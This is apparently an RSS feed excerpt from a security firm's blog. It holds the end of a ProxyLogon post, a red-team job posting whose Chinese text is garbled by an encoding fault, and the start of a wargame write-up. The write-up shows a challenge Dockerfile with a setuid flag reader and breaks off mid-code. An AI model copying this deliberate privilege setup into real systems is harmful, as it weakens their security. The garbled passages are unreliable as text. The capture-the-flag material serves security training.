&lt;div style=&quot;text-align: center;&quot;&gt;&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/SvjGMo9aMwE&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;&lt;/div&gt;

&lt;h1 id=&quot;epilogue&quot;&gt;Epilogue&lt;/h1&gt;

&lt;p&gt;As the first blog of this series, ProxyLogon perfectly shows how severe this attack surface could be. We will have more examples to come. Stay tuned!&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2021/08/06/a-new-attack-surface-on-MS-exchange-part-1-ProxyLogon/</link>
                <guid>https://devco.re/blog/2021/08/06/a-new-attack-surface-on-MS-exchange-part-1-ProxyLogon</guid>
                <pubDate>Fri, 06 Aug 2021 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>[å·²çµæŸ] DEVCORE å¾µæ±‚ç´…éšŠæ¼”ç·´å·¥ç¨‹å¸«</title>
                <description>&lt;p&gt;æˆ´å¤«å¯‡çˆ¾å·²æˆç«‹è¿‘ä¹å¹´ï¼Œéå»æˆ‘å€‘ä¸æ–·åœ°é‘½ç ”é€²éšæ”»æ“ŠæŠ€å·§ï¼Œç‚ºè¨±å¤šå®¢æˆ¶æä¾›é«˜å“è³ªçš„æ»²é€æ¸¬è©¦æœå‹™ï¼Œä¹Ÿæˆç‚ºå®¢æˆ¶æœ€ä¿¡è³´çš„è³‡å®‰ä¼™ä¼´ä¹‹ä¸€ã€‚åœ¨ 2017 å¹´æˆ‘å€‘æ›´æˆç‚ºç¬¬ä¸€å€‹åœ¨å°ç£æ¨å‡ºç´…éšŠæ¼”ç·´æœå‹™çš„æœ¬åœŸå» å•†ï¼Œé€éç„¡æ‰€ä¸ç”¨å…¶æ¥µçš„é§­å®¢æ€ç¶­ï¼Œé™¸çºŒç‚ºé›»å­å•†å‹™ã€æ”¿åºœéƒ¨é–€ã€é‡‘èæ¥­è€…åŸ·è¡Œæœ€çœŸå¯¦ä¸”å…¨é¢çš„æ”»æ“Šæ¼”ç·´ï¼ŒåŒæ™‚ä¹Ÿç´¯ç©äº†è±å¯Œçš„ç¶“é©—èˆ‡æ¡ˆä¾‹ï¼Œæˆç‚ºå°ç£ç´…éšŠæ¼”ç·´å¯¦åŠ›æœ€æ·±åšçš„æœå‹™ä¾›æ‡‰å•†ã€‚&lt;/p&gt;

&lt;p&gt;éš¨è‘—å…¬å¸è¦æ¨¡æ“´å¤§ï¼Œæˆ‘å€‘é¦–åº¦å…¬é–‹æ‹›å‹Ÿç´…éšŠæ¼”ç·´äººæ‰ï¼Œå¸Œæœ›èƒ½å¤ æ‰¾åˆ°ä¸€è‡³å…©ä½ Support ç´…éšŠæ¼”ç·´å·¥ç¨‹å¸«ï¼Œæ“´å¤§æˆ‘å€‘çš„å¾Œå‹¤èƒ½é‡ï¼Œéå›ºæˆ´å¤«å¯‡çˆ¾çš„åœ˜éšŠä½œæˆ°èƒ½åŠ›ï¼Œè®“æˆ‘å€‘æŒçºŒç‚ºä¼æ¥­æä¾›æœ€å„ªç•°çš„è³‡å®‰æœå‹™ã€‚&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘éå¸¸æ¸´æœ›æ‚¨çš„åŠ å…¥ï¼Œè‹¥æ‚¨æœ‰æ„æˆç‚ºæˆ´å¤«å¯‡çˆ¾çš„ä¸€å“¡ï¼Œå¯åƒè€ƒä¸‹åˆ—è·ç¼ºç´°ç¯€ï¼š&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;å·¥ä½œå…§å®¹&quot;&gt;å·¥ä½œå…§å®¹&lt;/h3&gt;

&lt;p&gt;åœ¨æ»²é€æ¸¬è©¦ã€ç´…éšŠæ¼”ç·´å°ˆæ¡ˆä¸­æ“”ä»»é‡è¦çš„å¾Œå‹¤å·¥ä½œã€‚é€™æœƒæ˜¯æœ€æ¸…æ¥šå…¨å±€æˆ°æ³çš„è§’è‰²ï¼Œéœ€è¦è§€å¯Ÿã€è¨˜éŒ„æ•´é«”æˆ°æ³ï¼Œç´°å¿ƒä¸”è€å¿ƒåœ°æ•´ç†ç¹é›œçš„æˆ°å±€è³‡è¨Šï¼Œä¸¦ä¸”æ¨‚æ–¼èˆ‡ä½œæˆ°å¤¥ä¼´æºé€šç¾æœ‰æˆ°æ³ã€‚æª¢æ¸¬çµæŸå¾Œéœ€è¦å°‡å®Œæ•´çš„æˆ°æ³è³‡è¨Šå’Œæª¢æ¸¬éç¨‹ä¸­ç™¼ç¾çš„å¼±é»å½™æ•´æˆå ±å‘Šå’Œç°¡å ±ï¼Œè®“å®¢æˆ¶æ¸…æ¥šç†è§£å¼±é»æŠ€è¡“ç´°ç¯€èˆ‡æˆå› ï¼Œä¸”å¯ä¾æ“šæŠ€è¡“ç´°ç¯€é‡ç¾å·²ç™¼ç¾çš„å¼±é»ï¼Œæœ€å¾Œå”åŠ©æª¢æ¸¬å®¢æˆ¶çš„ä¿®è£œç‹€æ³ã€‚&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;å”åŠ©ä½œæˆ° 40%
    &lt;ul&gt;
      &lt;li&gt;æ•´åˆä½œæˆ°è³‡æ–™ï¼Œé—œè¯æˆ°å ´è³‡è¨Šå”åŠ©éšŠå‹æ‰¾åˆ°çªç ´é»&lt;/li&gt;
      &lt;li&gt;è¿½è¹¤æŒæ¡æˆ°æ³é€²åº¦&lt;/li&gt;
      &lt;li&gt;å°ˆæ¡ˆä¸­èˆ‡å®¢æˆ¶å”èª¿é›™æ–¹éœ€æ±‚&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;æœƒè­° 10%
    &lt;ul&gt;
      &lt;li&gt;åƒèˆ‡å°ˆæ¡ˆç›¸é—œå•Ÿå‹•ã€çµæ¡ˆæœƒè­°&lt;/li&gt;
      &lt;li&gt;æˆæœç°¡å ±&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;æ’°å¯«èˆ‡è£½ä½œå ±å‘Šæ–‡ä»¶ 40%
    &lt;ul&gt;
      &lt;li&gt;è£½ä½œå ±å‘Šæ›¸ã€ç°¡å ±ã€æ—¥èªŒ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;æª¢æ¸¬ (åˆæ¸¬ã€è¤‡æ¸¬) 10%
    &lt;ul&gt;
      &lt;li&gt;æª¢æ¸¬å¼±é»ä¿®è£œ&lt;/li&gt;
      &lt;li&gt;è¤‡æ¸¬æ™‚ç¨‹å®‰æ’èˆ‡å”èª¿&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;å·¥ä½œæ™‚é–“&quot;&gt;å·¥ä½œæ™‚é–“&lt;/h3&gt;
&lt;p&gt;10:00 - 18:00 (ä¸­é–“ä¼‘æ¯ 1 å°æ™‚ 13:00 - 14:00)&lt;/p&gt;

&lt;h3 id=&quot;å·¥ä½œåœ°é»&quot;&gt;å·¥ä½œåœ°é»&lt;/h3&gt;
&lt;p&gt;å°åŒ—å¸‚ä¸­å±±å€å¾©èˆˆåŒ—è·¯ 168 è™Ÿ 10 æ¨“
è¿‘æœŸæœƒæ¬é·è‡³å°åŒ—ç”°å¾‘å ´é™„è¿‘ï¼ˆæ·é‹å°åŒ—å°å·¨è›‹ç«™ï¼‰&lt;/p&gt;

&lt;h3 id=&quot;å·¥ä½œæ¢ä»¶è¦æ±‚&quot;&gt;å·¥ä½œæ¢ä»¶è¦æ±‚&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;ç†Ÿæ‚‰ OWASP Web Top 10ã€‚&lt;/li&gt;
  &lt;li&gt;ç†Ÿæ‚‰ Microsoft Word æˆ– Mac Pagesã€‚&lt;/li&gt;
  &lt;li&gt;ç†Ÿæ‚‰ Microsoft PowerPoint æˆ– Mac Keynoteã€‚&lt;/li&gt;
  &lt;li&gt;ç†Ÿæ‚‰ BurpSuite æˆ–å…¶ä»– HTTP å°åŒ…ä¿®æ”¹æ””æˆªå·¥å…·ã€‚&lt;/li&gt;
  &lt;li&gt;å…·æœ‰ç¨‹å¼ Debug èƒ½åŠ›ï¼Œèƒ½é‡ç¾ä¸¦æ”¶æ–‚å•é¡Œã€‚&lt;/li&gt;
  &lt;li&gt;ç†Ÿæ‚‰ç¶²é ç¨‹å¼èªè¨€ï¼ˆå¦‚ PHPã€ASPXã€JSPï¼‰ï¼Œæ›¾å»ºç«‹è‡ªå·±æˆ–åˆ¥äººå¸¸ç”¨çš„ç¶²é æœå‹™ã€‚&lt;/li&gt;
  &lt;li&gt;ç†Ÿæ‚‰ Scripting èªè¨€ï¼ˆå¦‚ ShellScriptã€Pythonã€Rubyï¼‰ï¼Œä½¿ç”¨è…³æœ¬è¼”ä»¥å·¥ä½œï¼Œäº¦èƒ½ç†è§£å°ˆæ¡ˆæ‰€ç”¨çš„ç›¸é—œè…³æœ¬ã€‚&lt;/li&gt;
  &lt;li&gt;ç†Ÿæ‚‰ Command Line æ“ä½œè¼”ä»¥å·¥ä½œï¼ŒåŒ…å«åŸ·è¡Œ Unix-like å’Œ Windows çš„ç³»çµ±æŒ‡ä»¤ã€å·¥å…·ç­‰ï¼Œäº¦èƒ½ç†è§£å°ˆæ¡ˆæ‰€ç”¨çš„ç›¸é—œæŒ‡ä»¤ã€‚&lt;/li&gt;
  &lt;li&gt;ç†Ÿæ‚‰ curlã€netcatã€nmapã€Dirb ç­‰å®‰å…¨æ¸¬è©¦ç›¸é—œå·¥å…·ã€‚&lt;/li&gt;
  &lt;li&gt;æœ‰ä¿¡å¿ƒåˆ°è·ä¸€å¹´å…§æ‹¿åˆ° Offensive Security Certified Professional (OSCP) è­‰ç…§æˆ–æ“æœ‰ç­‰å€¼èƒ½åŠ›ã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;äººæ ¼ç‰¹è³ªåå¥½&quot;&gt;äººæ ¼ç‰¹è³ªåå¥½&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;å„ªç§€çš„æ–‡å­—çµ„ç¹”èƒ½åŠ›èˆ‡é‚è¼¯æ€è€ƒï¼Œæ‡‚å¾—é€éæ·ºé¡¯æ˜“æ‡‚ä¸”æ¢ç†æ¸…æ™°çš„æ–¹å¼å‚³é”å…§å®¹çµ¦å®¢æˆ¶æˆ–å…§éƒ¨åœ˜éšŠã€‚&lt;/li&gt;
  &lt;li&gt;æ“æœ‰å¼·å¤§çš„å­¸ç¿’èƒ½åŠ›ï¼Œå°æ–¼ä»»ä½•ä¸æ‡‚çš„æŠ€è¡“ç´°ç¯€éƒ½èƒ½ä¸»å‹•è©¢å•åŒäº‹ï¼Œæƒ³è¾¦æ³•ç†è§£ä¸¦å…§åŒ–æˆè‡ªå·±çš„çŸ¥è­˜ã€‚&lt;/li&gt;
  &lt;li&gt;æ‡‚å¾—æºé€šå‚¾è½ï¼Œèƒ½åŒç†ä»–äººï¼Œæ‰¾å‡ºå½¼æ­¤å…±è­˜ã€‚&lt;/li&gt;
  &lt;li&gt;ç´°å¿ƒåš´è¬¹ï¼Œèƒ½è€å¿ƒçš„è™•ç†ç¹ç‘£çš„åº¶å‹™å·¥ä½œã€‚&lt;/li&gt;
  &lt;li&gt;ä¸»å‹•ç©æ¥µï¼Œçœ‹åˆ°æˆ‘å€‘æ²’ç™¼ç¾çš„ç´°ç¯€ï¼Œè¶…è¶Šæˆ‘å€‘æ‰€æœŸæœ›çš„åŸºæº–ã€‚&lt;/li&gt;
  &lt;li&gt;è‰¯å¥½çš„æ™‚é–“ç®¡ç†èƒ½åŠ›ï¼Œä¾æ“šä»»å‹™çš„å„ªå…ˆé †åºï¼Œæœ‰æ•ˆç‡çš„å®Œæˆæ¯é …äº¤è¾¦ã€‚&lt;/li&gt;
  &lt;li&gt;åœ¨å„ç¨®å·¥ä½œç´°ç¯€ä¸­ï¼Œæ‰¾åˆ°æœ€ä½³åŒ–æµç¨‹çš„æ–¹å¼ï¼Œå¹«åŠ©åœ˜éšŠæ›´æœ‰æ•ˆç‡çš„é‹ä½œã€‚&lt;/li&gt;
  &lt;li&gt;å‹‡æ–¼æ¥å—æŒ‘æˆ°ä¸”å…·å‚™è§£æ±ºå•é¡Œçš„èƒ½åŠ›ï¼ŒåŠªåŠ›å…‹æœæœªçŸ¥çš„é›£é¡Œã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;åŠ åˆ†æ¢ä»¶&quot;&gt;åŠ åˆ†æ¢ä»¶&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;æ›¾ç¶“æœ‰æ’°å¯«éç›¸é—œç´…éšŠæ¼”ç·´ã€æ»²é€æ¸¬è©¦ä¸­ã€è‹±æ–‡å ±å‘Šç­‰ç¶“é©—ã€‚&lt;/li&gt;
  &lt;li&gt;å·²è€ƒé Offensive Security Certified Professional (OSCP) è­‰ç…§ã€‚&lt;/li&gt;
  &lt;li&gt;æ›¾ç¶“æŒ–æ˜å¸¸è¦‹æ¼æ´ï¼ˆå¦‚ XSSã€SQL Injectionã€Broken Access Controlï¼‰ã€‚&lt;/li&gt;
  &lt;li&gt;æ›¾ç¶“å¯«éç›¸é—œ CTFã€Wargame æˆ–å¼±é»å›å ±ç­‰é¡å‹çš„ Writeupã€‚&lt;/li&gt;
  &lt;li&gt;æœ‰æ’°å¯«æŠ€è¡“é¡å‹ç­‰æ–‡ç« éƒ¨è½æ ¼ç¶“é©—ã€‚&lt;/li&gt;
  &lt;li&gt;å…·æœ‰å°ˆæ¡ˆç®¡ç†è¦åŠƒçš„èƒ½åŠ›ã€‚&lt;/li&gt;
  &lt;li&gt;ä¸­æ–‡ç›²æ‰“å…·å‚™ TQC å°ˆæ¥­ç´šæ°´æº–ã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;å·¥ä½œç’°å¢ƒ&quot;&gt;å·¥ä½œç’°å¢ƒ&lt;/h3&gt;
&lt;p&gt;æ–°è¾¦å…¬å®¤è£æ½¢ä¸­ï¼Œå¯åƒè€ƒä¹‹å‰çš„&lt;a href=&quot;https://devco.re/blog/2019/07/23/devcore-201907-recruit/&quot;&gt;å¾µæ‰æ–‡&lt;/a&gt;ï¼Œæœªä¾†è¾¦å…¬å®¤æœƒå„ªæ–¼éå»ã€‚&lt;/p&gt;

&lt;h3 id=&quot;å…¬å¸ç¦åˆ©&quot;&gt;å…¬å¸ç¦åˆ©&lt;/h3&gt;
&lt;p&gt;æˆ‘å€‘æ³¨é‡å…¬å¸æ¯ä½åŒä»çš„èº«å¿ƒå¥åº·ï¼Œè«‹åƒè€ƒä»¥ä¸‹ç¦åˆ©åˆ¶åº¦ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ä¼‘å‡ç¦åˆ©
    &lt;ul&gt;
      &lt;li&gt;åˆ°è·å³å¯é æ”¯ç•¶å¹´åº¦ç‰¹ä¼‘&lt;/li&gt;
      &lt;li&gt;æ¯å¹´äº”å¤©å…¨è–ªç—…å‡&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;çé‡‘ç¦åˆ©
    &lt;ul&gt;
      &lt;li&gt;ä¸‰ç¯€ç¦®é‡‘ï¼ˆæ˜¥ç¯€ã€ç«¯åˆç¯€ã€ä¸­ç§‹ç¯€ï¼‰&lt;/li&gt;
      &lt;li&gt;ç”Ÿæ—¥ç¦®é‡‘&lt;/li&gt;
      &lt;li&gt;å©šå–ªè£œåŠ©&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ä¼‘é–’ç¦åˆ©
    &lt;ul&gt;
      &lt;li&gt;å“¡å·¥æ—…éŠ&lt;/li&gt;
      &lt;li&gt;èˆ’å£“æŒ‰æ‘©&lt;/li&gt;
      &lt;li&gt;Team Building&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ç¾é£Ÿç¦åˆ©
    &lt;ul&gt;
      &lt;li&gt;é›¶é£Ÿé£²æ–™&lt;/li&gt;
      &lt;li&gt;å“¡å·¥èšé¤&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;å¥åº·ç¦åˆ©
    &lt;ul&gt;
      &lt;li&gt;å“¡å·¥å¥åº·æª¢æŸ¥&lt;/li&gt;
      &lt;li&gt;é‹å‹•ä¸­å¿ƒå¥èº«åˆ¸&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;é€²ä¿®ç¦åˆ©
    &lt;ul&gt;
      &lt;li&gt;å…§éƒ¨æ•™è‚²è¨“ç·´&lt;/li&gt;
      &lt;li&gt;å¤–éƒ¨é€²ä¿®èª²ç¨‹&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;å…¶ä»–
    &lt;ul&gt;
      &lt;li&gt;å°ˆæ¥­çš„å…¬å¸åœ˜éšŠ&lt;/li&gt;
      &lt;li&gt;æ‰å¹³çš„å…§éƒ¨çµ„ç¹”&lt;/li&gt;
      &lt;li&gt;é †æš¢çš„æºé€šæ°›åœ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;èµ·è–ªç¯„åœ&quot;&gt;èµ·è–ªç¯„åœ&lt;/h3&gt;
&lt;p&gt;æ–°å°å¹£ 60,000 - 80,000 ï¼ˆä¿è­‰å¹´è–ª 14 å€‹æœˆï¼‰&lt;/p&gt;

&lt;h3 id=&quot;æ‡‰å¾µæ–¹å¼&quot;&gt;æ‡‰å¾µæ–¹å¼&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;è«‹å°‡æ‚¨çš„å±¥æ­·ä»¥ PDF æ ¼å¼å¯„åˆ°Â recruiting@devco.re
    &lt;ul&gt;
      &lt;li&gt;å±¥æ­·æ ¼å¼è«‹åƒè€ƒç¯„ä¾‹ç¤ºæ„ï¼ˆ&lt;a href=&quot;/assets/files/recruit/Resume_Example.docx&quot;&gt;DOCX&lt;/a&gt;ã€&lt;a href=&quot;/assets/files/recruit/Resume_Example.pages&quot;&gt;PAGES&lt;/a&gt;ã€&lt;a href=&quot;/assets/files/recruit/Resume_Example.pdf&quot;&gt;PDF&lt;/a&gt;ï¼‰ä¸¦è½‰æˆ PDFã€‚è‹¥æ‚¨æœ‰è‡ªä¿¡ï¼Œä¹Ÿå¯ä»¥è‡ªç”±ç™¼æ®æœ€èƒ½å‘ˆç¾æ‚¨èƒ½åŠ›çš„å±¥æ­·ã€‚&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;æ¨™é¡Œæ ¼å¼ï¼š&lt;strong&gt;[æ‡‰å¾µ] ç´…éšŠæ¼”ç·´å·¥ç¨‹å¸« æ‚¨çš„å§“å&lt;/strong&gt;ï¼ˆç¯„ä¾‹ï¼š[æ‡‰å¾µ] ç´…éšŠæ¼”ç·´å·¥ç¨‹å¸« ç‹å°ç¾ï¼‰&lt;/li&gt;
  &lt;li&gt;å±¥æ­·å…§å®¹è«‹å‹™å¿…æ§åˆ¶åœ¨å…©é ä»¥å…§ï¼Œè‡³å°‘éœ€åŒ…å«ä»¥ä¸‹å…§å®¹ï¼š
    &lt;ul&gt;
      &lt;li&gt;åŸºæœ¬è³‡æ–™&lt;/li&gt;
      &lt;li&gt;å­¸æ­·&lt;/li&gt;
      &lt;li&gt;å·¥ä½œç¶“æ­·&lt;/li&gt;
      &lt;li&gt;ç¤¾ç¾¤æ´»å‹•ç¶“æ­·&lt;/li&gt;
      &lt;li&gt;ç‰¹æ®Šäº‹è¹Ÿ&lt;/li&gt;
      &lt;li&gt;MBTI è·æ¥­æ€§æ ¼æ¸¬è©¦çµæœï¼ˆ&lt;a href=&quot;https://www.apesk.com/mbti/dati_tw.asp&quot;&gt;æ¸¬è©¦ç¶²é &lt;/a&gt;ï¼‰&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;é™„è¨»&quot;&gt;é™„è¨»&lt;/h3&gt;

&lt;p&gt;æˆ‘å€‘æœƒåœ¨å…©é€±å…§ä¸»å‹•èˆ‡æ‚¨è¯ç¹«ï¼Œæ‹›å‹Ÿéç¨‹ä¾åºç‚ºæ›¸é¢å¯©æ ¸ã€ç·šä¸Šæ¸¬é©—ä»¥åŠé¢è©¦ä¸‰å€‹éšæ®µã€‚ç¬¬äºŒéšæ®µçš„ç·šä¸Šæ¸¬é©—æœ€å¿«å°‡æ–¼ä¸ƒæœˆåº•é€²è¡Œï¼Œç…©è«‹è€å¿ƒç­‰å€™ï¼›ç¬¬ä¸‰éšæ®µé¢è©¦è¦–ç–«æƒ…ç‹€æ³å¯èƒ½æœƒæ¡ç·šä¸Šé¢è©¦ã€‚
è‹¥æœ‰æ‡‰å¾µç›¸é—œå•é¡Œï¼Œè«‹ä¸€å¾‹ä½¿ç”¨ Email è¯ç¹«ï¼Œé€ æˆæ‚¨çš„ä¸ä¾¿è«‹è¦‹è«’ã€‚æˆ‘å€‘æ„Ÿè¬æ‚¨çš„ä¾†ä¿¡ï¼ŒæœŸå¾…æ‚¨çš„åŠ å…¥ï¼&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2021/06/22/devcore-202106-recruit/</link>
                <guid>https://devco.re/blog/2021/06/22/devcore-202106-recruit</guid>
                <pubDate>Tue, 22 Jun 2021 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>DEVCORE Wargame at HITCON 2020</title>
                <description>&lt;style type=&quot;text/css&quot;&gt;
    table {
        display: block;
        width: 100%;
        overflow: auto;
        word-break: normal;
        word-break: keep-all;
        font-size: smaller;
    }

    table th {
        font-weight: bold
    }

    table th,
    table td {
        padding: 5px 11px;
        border: 1px solid #ddd;
    }

    table tr {
        background-color: #fff;
        border-top: 1px solid #ccc;
    }

    table tr:nth-child(2n) {
        background-color: #f8f8f8;
    }
&lt;/style&gt;

&lt;p&gt;æ­æ™šå®‰ï½ä¸€å¹´ä¸€åº¦çš„è³‡å®‰åœˆå¤§æ‹œæ‹œæ´»å‹•ä¹‹ä¸€ HITCON 2020 åœ¨ç´„ä¸€å€‹æœˆå‰é †åˆ©è½å¹•å•¦ï¼Œä»Šå¹´æˆ‘å€‘ç…§èˆŠåœ¨æ”¤ä½æº–å‚™äº†å¹¾é“å°å°çš„ Wargame çµ¦æœƒçœ¾æœ‹å‹å€‘æŒ‘æˆ°è‡ªèº«æŠ€è¡“ï¼Œä¸¦åŒæ¨£æº–å‚™äº†å¹¾ä»½ç²¾ç¾å°ç¦®ç‰©é€çµ¦æŒ‘æˆ°æˆåŠŸçš„æœ‹å‹å€‘ã€‚&lt;/p&gt;

&lt;p&gt;ç¸½è¨ˆæ´»å‹•å…©å¤©é–“æœ‰ç™»å…¥ä¸¦æäº¤è‡³å°‘ä¸€æŠŠ flag çš„äººæ•¸ç‚º 92 äººï¼Œéå¸¸æ„Ÿè¬å¤§å®¶è¸´èºåœ°åƒèˆ‡ï¼Œé€™æ¬¡æœªèƒ½æˆåŠŸåœ¨æ™‚é–“å…§å®ŒæˆæŒ‘æˆ°è€Œæœªé ˜åˆ°å°ç¦®ç‰©çš„æœ‹å‹å€‘ä¹Ÿåˆ¥å¤ªç°å¿ƒï¼Œç‚ºäº†èƒ½æ›´å¤šçš„å›é¥‹ç¤¾ç¾¤ï¼Œæ‰€ä»¥æˆ‘å€‘æ±ºå®šå¯«ä¸€ç¯‡æŠ€è¡“æ–‡ç« ä»‹ç´¹æœ¬æ¬¡ Wargame çš„å…¶ä¸­ä¸€é“é–‹æ”¾å¼é¡Œç›®&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sqltest&lt;/code&gt;ï¼Œç‚ºæ­¤æˆ‘å€‘åœ¨æ´»å‹•å¾Œè©¢å•äº†æ‰€æœ‰è§£é¡Œçš„äººï¼Œæ”¶é›†äº†å¤§å®¶çš„è§£æ³•èˆ‡æ€è·¯ï¼Œä¸¦å°‡åœ¨æ–‡ç« çš„æ¥ä¸‹ä¾†ä¸€ä¸€ç‚ºå¤§å®¶ä»‹ç´¹ï¼&lt;/p&gt;

&lt;h2 id=&quot;sqltest-é¡Œç›®èªªæ˜&quot;&gt;sqltest é¡Œç›®èªªæ˜&lt;/h2&gt;

&lt;p&gt;é€™é“é¡Œç›®ä¸»è¦æ ¸å¿ƒçš„éƒ¨åˆ†å°±é€™ 3 å€‹æª”æ¡ˆï¼šDockerfileã€readflag.c å’Œ index.phpã€‚è®“æˆ‘å€‘å…ˆçœ‹çœ‹å‰å…©å€‹æª”æ¡ˆï¼Œå¯ä»¥å¾ä¸‹æ–¹çš„ Dockerfile ä¸­å…ˆè§€å¯Ÿåˆ° flag è¢«æ”¾ç½®åœ¨æª”æ¡ˆ /flag ä¹‹ä¸­ï¼Œä½†æ¬Šé™è¢«è¨­å®šç‚ºåƒ…æœ‰ root å¯ä»¥è®€å–ï¼Œå¦å¤–æº–å‚™äº†å…·æœ‰ setuid æ¬Šé™çš„åŸ·è¡Œæª” /readflagï¼Œè®“ä»»ä½•äººå‡å¯åœ¨åŸ·è¡Œæ­¤æª”æ¡ˆæ™‚å½è£æˆ root èº«åˆ†ï¼Œè€Œ /readflag çš„åŸå§‹ç¢¼å°±å¦‚ä¸‹æ–¹ readflag.c æ‰€ç¤ºï¼Œå¾ˆå–®ç´”çš„è®€å–ä¸¦è¼¸å‡º /flag æª”æ¡ˆå…§å®¹ï¼Œé€™å€‹é…ç½®å°±æ˜¯ä¸€å€‹å¾ˆæ¨™æº–ä»¥ getshell ç‚ºç›®æ¨™çš„ Wargame é¡Œç›®ã€‚&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Dockerfile&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-dockerfile highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; php:7.4.10-apache&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# setup OS env&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;RUN &lt;/span&gt;apt update &lt;span class=&quot;nt&quot;&gt;-y&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;RUN &lt;/span&gt;docker-php-ext-install mysqli
&lt;span class=&quot;k&quot;&gt;RUN &lt;/span&gt;docker-php-ext-enable mysqli

&lt;span class=&quot;c&quot;&gt;# setup web application&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;COPY&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; ./src/ /var/www/html/&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# setup flag&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;RUN &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;DEVCORE{flag}&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /flag
&lt;span class=&quot;k&quot;&gt;RUN &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;0400 /flag
&lt;span class=&quot;k&quot;&gt;RUN &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chown &lt;/span&gt;root:root /flag
&lt;span class=&quot;k&quot;&gt;COPY&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; readflag.c /readflag.c&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;RUN &lt;/span&gt;gcc &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; /readflag /readflag.c
&lt;span class=&quot;k&quot;&gt;RUN &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;4555 /readflag
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;readflag.c&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;seteuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;setegid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
